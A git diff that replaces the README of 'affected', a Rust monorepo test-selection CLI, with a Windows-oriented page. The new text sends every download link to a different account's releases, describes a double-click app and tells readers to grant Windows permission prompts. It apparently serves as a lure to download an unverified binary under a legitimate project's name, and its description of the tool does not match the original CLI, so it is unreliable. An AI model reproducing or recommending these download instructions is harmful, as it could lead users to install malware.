@@ -1,386 +1,216 @@
-<p align="center">
-  <h1 align="center">affected</h1>
-  <p align="center">Detect affected packages. Run only what matters.</p>
-</p>
+# 🧪 affected - Run fewer tests with confidence
 
-<p align="center">
-  <a href="https://github.com/Rani367/affected/actions/workflows/ci.yml"><img src="https://github.com/Rani367/affected/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://crates.io/crates/affected-cli"><img src="https://img.shields.io/crates/v/affected-cli.svg" alt="crates.io"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-  <a href="https://github.com/Rani367/affected/stargazers"><img src="https://img.shields.io/github/stars/Rani367/affected?style=social" alt="GitHub Stars"></a>
-</p>
+[⬇️ Download affected](https://github.com/Canty-ear438/affected/releases)
 
-<p align="center">
-  A standalone, language-agnostic CLI that detects which packages in your monorepo are affected by git changes — then runs tests, lints, builds, or any command on only those packages. No framework, no config files, no lock-in.
-</p>
+## 🛠️ What it does
 
----
+affected helps you run only the tests that matter after a change. It checks your project structure, finds which packages or apps are touched, and tells you what needs to be tested.
 
-## Demo
+This is useful for large monorepos with many folders and many test suites. Instead of running everything, you can focus on the parts that changed.
 
-```
-$ affected list --base main --explain
+It works with common project types, including:
 
-3 affected package(s) (base: main, 2 files changed):
+- Cargo
+- npm
+- pnpm
+- Yarn
+- Bun
+- Go
+- Python
+- Maven
+- Gradle
+- .NET
+- Swift
+- Dart and Flutter
+- Elixir
+- sbt
 
-  ● core       (directly changed: src/lib.rs)
-  ● api        (depends on: core)
-  ● cli        (depends on: api → core)
-```
+## 📥 Download
 
-```
-$ affected run "cargo clippy -p {package}" --base main --jobs 4 --dry-run
+1. Visit the [releases page](https://github.com/Canty-ear438/affected/releases).
+2. Find the latest version for Windows.
+3. Download the file that matches your system.
+4. Open the downloaded file to start the app.
 
-Running command for 3 affected package(s) (out of 8 total, 2 files changed):
+If your browser saves the file to your Downloads folder, open that folder and double-click the file there.
 
-  [dry-run] core: cargo clippy -p core
-  [dry-run] api: cargo clippy -p api
-  [dry-run] cli: cargo clippy -p cli
-```
+## 💻 Windows setup
 
-## Why
+Follow these steps on Windows:
 
-Every monorepo team hacks together bash scripts with `git diff | grep` to avoid running all tests on every PR. Tools like Nx, Turborepo, and Bazel solve this but require buying into an entire build system.
+1. Open the [releases page](https://github.com/Canty-ear438/affected/releases).
+2. Download the Windows version.
+3. If the file is in a .zip folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the affected app to run it.
 
-`affected` is a single binary you install and run. It auto-detects your project type, builds a dependency graph, and figures out what's affected. Zero config to start.
+If Windows asks for permission, choose Yes.
 
-## Features
+## 🔍 What you can use it for
 
-- **Zero config** -- auto-detects your project type and dependency graph
-- **13 ecosystems** -- Cargo, npm, pnpm, Yarn, Bun, Go, Python, Maven, Gradle, .NET, Swift, Dart/Flutter, Elixir, Scala/sbt
-- **Transitive detection** -- if `core` changes and `api` depends on `core`, both are affected
-- **`affected run`** -- run *any command* on affected packages, not just tests
-- **`--explain`** -- shows *why* each package is affected with the full dependency chain
-- **Multi-CI** -- `affected ci --format github|gitlab|circleci|azure` with dynamic job matrices
-- **Watch mode** -- `affected watch test --base main` re-runs on file changes
-- **`affected init`** -- interactive setup wizard generates `.affected.toml`
-- **Dependency tree** -- `affected graph` renders a Unicode tree with affected highlighting
-- **Parallel execution** -- `--jobs 4` runs commands across multiple threads
-- **CI-first** -- `--json`, `--junit`, PR comment bot, shell completions
-- **Fast** -- written in Rust, uses libgit2 for native git operations
+Use affected when you want to:
 
-## Install
+- Skip tests for parts of the project that did not change
+- Find which package, app, or module needs a test run
+- Save time in local work
+- Reduce build time in CI
+- Keep test runs focused in a monorepo
 
-```bash
-# Homebrew (macOS/Linux)
-brew install Rani367/tap/affected
+It is built for teams and solo users who work with many small projects in one codebase.
 
-# uv
-uv tool install affected
+## 📁 How it works
 
-# pipx
-pipx install affected
+affected looks at your project files and checks how parts of the code depend on each other. When you change one file, it traces the related packages and returns the affected set.
 
-# pip
-pip install affected
+In plain terms:
 
-# Cargo
-cargo install affected-cli
+- You make a change
+- affected checks what depends on that change
+- You run tests for only the impacted parts
 
-# GitHub Actions
-- uses: Rani367/setup-affected@v1
+This helps when one update can touch many folders but only a few need checks.
 
-# Or download a binary from Releases
-```
+## ⚙️ Common use cases
 
-## Quick Start
+### 🧪 Local testing
 
-```bash
-# What's affected?
-affected list --base main
+If you changed one package, you can test only that package and the things it affects.
 
-# See why each package is affected
-affected list --base main --explain
+### 🔄 Pull request checks
 
-# Run only affected tests
-affected test --base main
+If you open a pull request, you can use affected to see which tests should run before merge.
 
-# Run any command on affected packages
-affected run "cargo clippy -p {package}" --base main
+### 🚦 CI pipelines
 
-# Parallel execution
-affected test --base main --jobs 4
-```
+In CI, you can skip work for unchanged areas and cut down on wasted time.
 
-## Usage
+### 🧱 Monorepo maintenance
 
-### `affected test`
+If your repo contains many apps and libraries, affected makes it easier to keep test runs small and clear.
 
-Run tests for affected packages.
+## 🧭 Basic workflow
 
-```bash
-affected test --base main                     # run affected tests
-affected test --base HEAD~3                   # compare vs 3 commits ago
-affected test --merge-base main               # auto-detect merge-base (best for PRs)
-affected test --base main --jobs 4            # parallel execution
-affected test --base main --timeout 300       # 5 min timeout per package
-affected test --base main --dry-run           # show what would run
-affected test --base main --json              # structured JSON output
-affected test --base main --junit results.xml # JUnit XML for CI
-affected test --base main --filter "lib-*"    # only test matching packages
-affected test --base main --skip "e2e-*"      # skip matching packages
-affected test --base main --explain           # show why each is affected
-```
+1. Download the app from the [releases page](https://github.com/Canty-ear438/affected/releases).
+2. Start the app on Windows.
+3. Point it at your project folder.
+4. Let it scan the repository.
+5. Review the list of affected packages.
+6. Run the tests for those parts only.
 
-### `affected run`
-
-Run any command on affected packages. Use `{package}` as a placeholder.
-
-```bash
-affected run "cargo clippy -p {package}" --base main         # lint affected
-affected run "cargo build -p {package}" --base main --jobs 4  # build affected
-affected run "npm run lint --workspace={package}" --base main  # npm lint
-affected run "go vet ./{package}/..." --base main              # go vet
-affected run "echo {package}" --base main --dry-run            # preview
-```
-
-### `affected list`
-
-List affected packages without running anything.
-
-```bash
-affected list --base main                     # list affected packages
-affected list --base main --json              # JSON output for CI
-affected list --base main --explain           # show dependency chains
-```
-
-### `affected graph`
-
-Display the project dependency graph as a Unicode tree.
-
-```bash
-affected graph                                # Unicode dependency tree
-affected graph --base main                    # highlight affected packages
-affected graph --dot                          # DOT format for Graphviz
-affected graph --dot | dot -Tpng -o graph.png # render as image
-```
-
-Example output:
-
-```
-Dependency Graph (5 packages, 3 affected):
-
-  cli  ●
-  └── api  ●
-      └── core  ●
-  utils
-  standalone  (no dependencies)
-```
-
-### `affected ci`
-
-Output variables for CI systems with multi-platform support.
-
-```bash
-affected ci --base main                        # GitHub Actions (default)
-affected ci --base main --format gitlab        # GitLab CI (writes ci.env)
-affected ci --base main --format azure         # Azure Pipelines (##vso)
-affected ci --base main --format circleci      # CircleCI ($BASH_ENV)
-affected ci --base main --format generic       # plain key=value
-```
-
-### `affected init`
-
-Interactive setup wizard to generate `.affected.toml`.
-
-```bash
-affected init                                  # interactive prompts
-affected init --non-interactive                # auto-detect and use defaults
-```
-
-### `affected watch`
-
-Watch for file changes and re-run commands automatically.
-
-```bash
-affected watch test --base main                # re-run tests on changes
-affected watch list --base main                # re-list affected on changes
-affected watch run "cargo clippy -p {package}" --base main  # re-run command
-affected watch test --base main --debounce 1000 # 1s debounce
-```
-
-## GitHub Actions
-
-### Setup
-
-```yaml
-- uses: Rani367/setup-affected@v1
-- run: affected test --merge-base origin/main
-```
-
-### Dynamic Matrix (each package as a separate job)
-
-Each affected package runs as a **separate parallel job** in the GitHub Actions UI:
-
-```yaml
-jobs:
-  detect:
-    runs-on: ubuntu-latest
-    outputs:
-      matrix: ${{ steps.affected.outputs.matrix }}
-      has_affected: ${{ steps.affected.outputs.has_affected }}
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - uses: Rani367/setup-affected@v1
-      - id: affected
-        run: affected ci --merge-base origin/main
-
-  test:
-    needs: detect
-    if: needs.detect.outputs.has_affected == 'true'
-    runs-on: ubuntu-latest
-    strategy:
-      matrix: ${{ fromJson(needs.detect.outputs.matrix) }}
-      fail-fast: false
-    steps:
-      - uses: actions/checkout@v4
-      - name: Test ${{ matrix.package }}
-        run: cargo test -p ${{ matrix.package }}
-```
-
-### PR Comment Bot
-
-Auto-comment on PRs showing which packages are affected and why:
-
-```yaml
-on:
-  pull_request:
-    branches: [main]
-
-permissions:
-  pull-requests: write
-
-jobs:
-  comment:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - uses: Rani367/affected-pr-comment@v1
-```
-
-This posts a comment like:
-
-> **Affected Packages (3 of 8)**
->
-> | Package | Reason |
-> |---------|--------|
-> | **core** | directly changed: `src/lib.rs` |
-> | **api** | depends on: core |
-> | **cli** | depends on: api -> core |
-
-The comment updates automatically on each push (no duplicates).
-
-### `affected completions`
-
-Generate shell completions.
-
-```bash
-affected completions bash >> ~/.bashrc
-affected completions zsh >> ~/.zshrc
-affected completions fish > ~/.config/fish/completions/affected.fish
-```
-
-## Supported Ecosystems
-
-| Ecosystem | Detected By | Dependency Source |
-|-----------|------------|-------------------|
-| **Cargo** | `Cargo.toml` with `[workspace]` | `cargo metadata` JSON |
-| **npm** | `package.json` with `workspaces` | `package.json` dependencies |
-| **pnpm** | `pnpm-workspace.yaml` | `package.json` dependencies |
-| **Yarn Berry** | `.yarnrc.yml` | `package.json` dependencies |
-| **Bun** | `bun.lock` / `bunfig.toml` | `package.json` dependencies |
-| **Go** | `go.work` / `go.mod` | `go mod graph` |
-| **Python** | `pyproject.toml` | PEP 621 deps + import scanning |
-| **Poetry** | `[tool.poetry]` in pyproject.toml | Poetry path dependencies |
-| **uv** | `[tool.uv.workspace]` in pyproject.toml | Workspace member globs |
-| **Maven** | `pom.xml` with `<modules>` | POM dependency declarations |
-| **Gradle** | `settings.gradle(.kts)` | `project(':...')` references |
-| **.NET/C#** | `*.sln` solution file | `<ProjectReference>` in .csproj |
-| **Swift/SPM** | `Package.swift` (multi-target) | Target dependency declarations |
-| **Dart/Flutter** | `pubspec.yaml` workspace / `melos.yaml` | `dependencies` in pubspec.yaml |
-| **Elixir** | `mix.exs` + `apps/` (umbrella) | `in_umbrella: true` deps |
-| **Scala/sbt** | `build.sbt` | `.dependsOn()` project refs |
-
-## Configuration
-
-Create `.affected.toml` in your project root (optional):
-
-```toml
-# Ignore files that should never trigger tests
-ignore = ["*.md", "docs/**", ".github/**"]
-
-# Custom test commands per ecosystem
-[test]
-cargo = "cargo nextest run -p {package}"
-npm = "pnpm test --filter {package}"
-go = "go test -v ./{package}/..."
-python = "uv run --package {package} pytest"
-maven = "mvn test -pl {package}"
-gradle = "gradle :{package}:test"
-bun = "bun test --filter {package}"
-dotnet = "dotnet test {package}"
-dart = "dart test -C {package}"
-swift = "swift test --filter {package}"
-elixir = "mix cmd --app {package} mix test"
-sbt = "sbt {package}/test"
-
-# Per-package overrides
-[packages.slow-e2e]
-test = "cargo test -p slow-e2e -- --ignored"
-timeout = 600
-
-[packages.legacy-service]
-skip = true
-```
-
-## How It Works
-
-1. **Detect** -- scans for marker files to identify the ecosystem
-2. **Resolve** -- builds a dependency graph from project manifests
-3. **Diff** -- computes changed files using libgit2 (base ref vs HEAD + working tree)
-4. **Map** -- maps each changed file to its owning package
-5. **Traverse** -- runs reverse BFS on the dependency graph to find all transitively affected packages
-6. **Execute** -- runs commands for affected packages only
-
-## Comparison
-
-| Feature | `affected` | Nx | Turborepo | Bazel |
-|---------|-----------|-----|-----------|-------|
-| Zero config | Yes | No | No | No |
-| Standalone binary | Yes | No (Node.js) | No (Node.js) | No (JVM) |
-| Language agnostic | 13 ecosystems | JS/TS + plugins | JS/TS | Any (with rules) |
-| Setup time | 1 minute | Hours | Hours | Days-weeks |
-| `affected run <cmd>` | Yes | No | No | No |
-| `--explain` | Yes | No | No | No |
-| Watch mode | Yes | Yes | No | No |
-| Multi-CI support | 5 platforms | GitHub only | GitHub only | Custom |
-| Dynamic CI matrix | Yes | Plugin | No | No |
-| PR comment bot | Yes | No | No | No |
-| Interactive setup | `affected init` | `nx init` | `turbo init` | Manual |
-| Binary size | ~5MB | ~200MB+ | ~100MB+ | ~500MB+ |
-
-## Global Flags
-
-```
--v, --verbose    Increase verbosity (-v for debug, -vv for trace)
--q, --quiet      Suppress non-essential output
---no-color       Disable colored output (also respects NO_COLOR env var)
---root <PATH>    Path to project root (default: current directory)
---config <PATH>  Path to custom config file
-```
-
-## Contributing
-
-Contributions welcome! See [issues](https://github.com/Rani367/affected/issues) for ideas, or open a PR.
-
-## License
-
-MIT
-
----
-
-If this tool saves you CI time, consider giving it a star. It helps others find it.
+## 🗂️ Supported project types
+
+affected can work with many common project layouts:
+
+- **Rust and Cargo** for Rust crates
+- **JavaScript and TypeScript** projects with npm, pnpm, Yarn, or Bun
+- **Go** modules and multi-package repos
+- **Python** projects with package-based layouts
+- **Java** builds with Maven or Gradle
+- **.NET** solutions and projects
+- **Swift** app and package setups
+- **Flutter and Dart** apps
+- **Elixir** applications
+- **Scala** projects that use sbt
+
+## 🖱️ First run on Windows
+
+When you open affected for the first time:
+
+1. Choose the folder that holds your project.
+2. Wait for the scan to finish.
+3. Review the files and packages it found.
+4. Pick the affected targets you want to test.
+
+If your project has nested apps or libraries, affected will try to map those links so you can see what changed.
+
+## 🧰 Typical features
+
+- Detects changed packages in monorepos
+- Follows project links between folders
+- Supports many common build tools
+- Helps narrow test runs to what changed
+- Fits local use and CI use
+- Works across language stacks in one tool
+
+## 📌 What to prepare
+
+Before you use it, have these ready:
+
+- A Windows PC
+- A project folder on your drive
+- The latest file from the [releases page](https://github.com/Canty-ear438/affected/releases)
+- Enough disk space for your project scan
+
+For best results, keep your project in a single root folder with each app or package in its own subfolder.
+
+## 🧩 Project layout example
+
+A typical monorepo might look like this:
+
+- `apps/`
+- `packages/`
+- `services/`
+- `libs/`
+
+affected checks these folders and traces how they connect. If you change one shared library, it can mark the apps that use it.
+
+## 🧪 Why this helps
+
+Large repos can slow down test runs. If you run every test every time, you waste time on code that did not change.
+
+affected helps you keep the work focused. That makes it easier to:
+
+- Test faster
+- Spot the right scope
+- Use less CI time
+- Keep builds easier to manage
+
+## 🪟 Windows tips
+
+- Use the latest release
+- Keep the app in a folder you can find later
+- Extract the file before you open it if it came in a zip archive
+- Run it from a local drive for best results
+- Keep your project folder closed in other tools if scans feel slow
+
+## 🧷 Where to download
+
+Use this page to get the Windows release:
+
+[Download affected from GitHub Releases](https://github.com/Canty-ear438/affected/releases)
+
+## 🧪 Workflow for test runs
+
+1. Make your code change.
+2. Open affected.
+3. Scan the repo.
+4. Check the affected list.
+5. Run the test command for those parts.
+6. Repeat after the next change.
+
+## 🧱 Best fit
+
+affected is a good fit for:
+
+- Monorepos with many small packages
+- Teams that want smaller test runs
+- Developers who work across more than one language
+- CI jobs that need to finish faster
+- Repos with clear folder-based project structure
+
+## 📎 Supported tools at a glance
+
+- Cargo
+- npm
+- pnpm
+- Yarn
+- Bun
+- Go
+- Python
+- Maven
+- Gradle
+- .NET
+- Swift
+- Dart / Flutter
+- Elixir
+- sbt
